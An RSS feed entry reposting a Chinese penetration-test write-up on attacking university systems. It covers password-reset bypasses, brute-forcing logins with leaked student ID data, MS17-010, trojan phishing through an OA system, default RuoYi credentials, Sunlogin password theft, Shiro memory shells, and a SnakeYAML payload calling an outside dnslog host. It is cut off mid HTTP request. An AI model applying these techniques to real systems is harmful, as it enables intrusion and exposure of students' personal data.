<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>信息收集 - 标签 - bysec</title>
        <link>https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
        <description>信息收集 - 标签 - bysec</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="self" type="application/rss+xml" /><item>
    <title>教育行业渗透打点</title>
    <link>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
    <pubDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
</blockquote>
<p>1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息&hellip;</p>
<h2 id="1oa系统密码找回" class="headerLink">
    <a href="#1oa%e7%b3%bb%e7%bb%9f%e5%af%86%e7%a0%81%e6%89%be%e5%9b%9e" class="header-mark"></a>1、OA系统密码找回</h2><h2 id="找回密码" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81" class="header-mark"></a>找回密码</h2><p>系统使用说明文档中发现登录账号 600030</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png">
        
    </a></p>
<p>密码找回，找回方式选择密保问题</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png">
        
    </a></p>
<p>问题选择出生地，密保问题答案填写高校所在地</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png">
        
    </a></p>
<p>即可修改密码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png">
        
    </a></p>
<p>修改密码，即可以图文信息中心的身份登录OA系统</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png">
        
    </a></p>
<p>在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png">
        
    </a></p>
<p>成功登录一部分账号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png">
        
    </a></p>
<h2 id="登录vpn" class="headerLink">
    <a href="#%e7%99%bb%e5%bd%95vpn" class="header-mark"></a>登录VPN</h2><p>进行内网扫描，利用MS17010拿下C段多台主机权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png">
        
    </a></p>
<h2 id="钓鱼" class="headerLink">
    <a href="#%e9%92%93%e9%b1%bc" class="header-mark"></a>钓鱼</h2><p>利用OA系统的通讯功能，散播木马</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png">
        
    </a></p>
<p>获取多台机器权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png">
        
    </a></p>
<h2 id="2逻辑漏洞修改密码" class="headerLink">
    <a href="#2%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>2、逻辑漏洞修改密码</h2><h2 id="github密码泄漏" class="headerLink">
    <a href="#github%e5%af%86%e7%a0%81%e6%b3%84%e6%bc%8f" class="header-mark"></a>GitHub密码泄漏</h2><p>GitHub泄漏学号密码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png">
        
    </a></p>
<p>但账号已被禁用</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png">
        
    </a></p>
<h2 id="获取学号手机号" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e5%ad%a6%e5%8f%b7%e6%89%8b%e6%9c%ba%e5%8f%b7" class="header-mark"></a>获取学号手机号</h2><p>存在注册功能的网站注册用户，然后登录</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png">
        
    </a></p>
<p>通过以下接口获得用户ID /User/GetUserListByKeyWord</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png">
        
    </a></p>
<p>可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息</p>
<p>/User/Tip?time61&amp;id=caec35e7-9956-4f68-98bc-e2aee73ebda5&amp;_=1664438691592</p>
<p>获取多组学号、姓名、手机号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png">
        
    </a></p>
<h2 id="修改密码" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>修改密码</h2><p>点击同意门户的忘记密码功能，输入上面得到的学号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png">
        
    </a></p>
<p>输入手机号，点击获取验证码并抓包</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png">
        
    </a></p>
<p>记录回包内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;datas&#34;</span><span class="o">:</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">sign</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">407ec6dc275f4766a4525e059a60ca16</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">,</span><span class="s2">&#34;code&#34;</span><span class="o">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;message&#34;</span><span class="o">:</span><span class="s2">&#34;获取成功&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png">
        
    </a></p>
<p>可以看到页面跳转到了设置密码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png">
        
    </a></p>
<p>成功更改密码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png">
        
    </a></p>
<p>79个应用，通过其中一个aspx站SQL注入拿到shell</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" title="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png">
        
    </a></p>
<h2 id="3github泄漏账号密码" class="headerLink">
    <a href="#3github%e6%b3%84%e6%bc%8f%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>3、Github泄漏账号密码</h2><h2 id="账号密码" class="headerLink">
    <a href="#%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>账号密码</h2><p>1、GitHub搜索&quot;学校域名&quot; &ldquo;password&rdquo; 发现邮箱账号密码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png">
        
    </a></p>
<p>2、登录邮箱发现手机号身份证号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png">
        
    </a></p>
<h2 id="统一门户" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7" class="header-mark"></a>统一门户</h2><p>3、手机号加邮箱密码直接登录统一门户</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png">
        
    </a></p>
<h2 id="泛微oa" class="headerLink">
    <a href="#%e6%b3%9b%e5%be%aeoa" class="header-mark"></a>泛微OA</h2><p>跳转到泛微OA,文件上传GetShell</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png">
        
    </a></p>
<h2 id="4向日葵密码读取" class="headerLink">
    <a href="#4%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>4、向日葵密码读取</h2><h2 id="heapdump文件泄漏" class="headerLink">
    <a href="#heapdump%e6%96%87%e4%bb%b6%e6%b3%84%e6%bc%8f" class="header-mark"></a>heapdump文件泄漏</h2><p>直接下载heapdump文件</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png">
        
    </a></p>
<p>读取到mssql账号密码</p>
<h2 id="向日葵密码读取" class="headerLink">
    <a href="#%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>向日葵密码读取</h2><p>成功连接mssql服务器，执行xp_cmdshell</p>
<p>C:\Program Files\Oray\SunLogin\SunloginClient\config.ini为向日葵的默认安装配置文件，直接尝试读取</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png">
        
    </a></p>
<p>fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png">
        
    </a></p>
<p>可以使用GitHub解密项目<a href="https://github.com/wafinfo/Sunflower_get_Password" target="_blank" rel="noopener noreferrer">https://github.com/wafinfo/Sunflower_get_Password</a>进行解密。</p>
<p>解密后成功连接目标主机服务器</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png">
        
    </a></p>
<h2 id="5若依漏洞getshell" class="headerLink">
    <a href="#5%e8%8b%a5%e4%be%9d%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>5、若依漏洞GetShell</h2><p>1、某学院首页</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png">
        
    </a></p>
<p>2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png">
        
    </a></p>
<h2 id="定时任务命令执行" class="headerLink">
    <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>定时任务命令执行</h2><p>以管理员权限登录在定时任务处新增</p>
<p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&ldquo;<a href="ftp://ceshi.bdtmos.dnslog.cn" target="_blank" rel="noopener noreferrer">ftp://ceshi.bdtmos.dnslog.cn</a>&rdquo;] ]] ]&rsquo;)运行任务</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png">
        
    </a>DNSlog平台收到请求</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png">
        
    </a></p>
<h2 id="shiro-反序列化漏洞" class="headerLink">
    <a href="#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>shiro 反序列化漏洞</h2><p>工具直接开扫，成功注入内存马</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png">
        
    </a></p>
<p>连接内存马</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png">
        
    </a></p>
<p>发现历史入侵痕迹，发现fscan黑客漏扫工具</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png">
        
    </a></p>
<h2 id="sql注入" class="headerLink">
    <a href="#sql%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入</h2><p>sql注入当时也懒得去尝试，估计也是存在的</p>
<p>/system/role/list</p>
<p>/system/role/export</p>
<p>/system/dept/edit</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">system</span><span class="o">/</span><span class="nx">role</span><span class="o">/</span><span class="k">list</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="nx">Host</span><span class="o">:</span> <span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span> <span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span> <span class="nx">User</span><span class="o">-</span><span 